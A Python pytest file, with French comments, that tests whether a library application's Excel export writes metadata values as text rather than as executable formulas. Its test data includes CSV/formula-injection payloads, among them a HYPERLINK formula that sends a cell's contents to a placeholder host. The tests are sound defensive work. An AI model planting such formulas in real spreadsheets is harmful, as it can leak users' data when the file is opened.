"""
test_library_excel_export.py — Export Excel de la Bibliothèque : une valeur
venue des métadonnées d'une BD est écrite comme texte, jamais comme formule.

openpyxl fait d'une chaîne qui commence par « = » une formule, que le tableur
calcule à l'ouverture (library_window._excel_text_cells corrige le type).
Le classeur est réellement écrit puis relu.

Fait partie de la suite pytest normale :  python -m pytest tests/
"""
import io
import zipfile

import openpyxl

import ast_loader

_TRAPPED = ['=HYPERLINK("https://site.invalid/?d="&B2,"Ouvrir")', "=1+1",
            "+1", "-1", "@SUM(A1)", "Aaaa #001 - Bbbb"]


def _excel_text_cells():
    return ast_loader.load("library_window.py", {"_excel_text_cells"})["_excel_text_cells"]


def _written_sheet(row, fix):
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.append(row)
    if fix:
        _excel_text_cells()(ws[1])
    buf = io.BytesIO()
    wb.save(buf)
    with zipfile.ZipFile(buf) as zf:
        sheet_xml = zf.read("xl/worksheets/sheet1.xml").decode("utf-8")
    buf.seek(0)
    return openpyxl.load_workbook(buf).active, sheet_xml


def test_without_fix_openpyxl_writes_a_formula():
    """Le danger existe bien : sans correction, la cellule devient une
    formule (sinon le test suivant ne prouverait rien)."""
    _ws, sheet_xml = _written_sheet(_TRAPPED, fix=False)
    assert "<f>" in sheet_xml


def test_values_are_written_as_text_unchanged():
    ws, sheet_xml = _written_sheet(_TRAPPED, fix=True)
    assert "<f>" not in sheet_xml
    assert [c.value for c in ws[1]] == _TRAPPED
    assert all(c.data_type == "s" for c in ws[1])


def test_numbers_stay_numbers():
    ws, _sheet_xml = _written_sheet([123456, "=x", None], fix=True)
    assert ws["A1"].value == 123456
    assert ws["A1"].data_type == "n"
    assert ws["B1"].value == "=x"
